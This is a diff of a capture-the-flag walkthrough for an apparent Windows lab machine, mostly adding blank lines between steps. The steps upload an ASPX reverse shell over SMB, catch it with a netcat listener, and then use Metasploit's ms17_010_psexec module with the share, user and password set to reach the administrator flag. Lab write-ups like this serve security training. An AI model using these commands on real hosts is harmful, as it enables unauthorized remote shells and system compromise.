@@ -220,23 +220,40 @@ $ smbclient \\\\$ip\\nt4wrksv
 link: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
 
 $ put shell.aspx
+
 $ nc -lvnp 1234
+
 $ curl http://$ip:49663/nt4wrksv/shell.aspx -v
+
 $ cd c:\Users\Bob\Desktop
+
 $ type user.txt
 
 
 ### Root Flag
 
 $ msfconsole 
+
 $ use windows/smb/ms17_010_psexec
+
 $ show options
+
 $ set RHOSTS $ip
+
 $ set LHOST $your_ip
-$ set SHARE nt4wrksv  # by default the exploit uses ADMIN$, you need change this
+
+$ set SHARE nt4wrksv  # by default the exploit uses 
+ADMIN$, you need change this
+
 $ set SMBUser Bob
+
 $ set SMBPAss 'password' 
+
 $ run 
+
 $ cd c:\Users\Administrator\Desktop\
+
 $ cat root.txt # if you use meterpreter :)
+
+
 
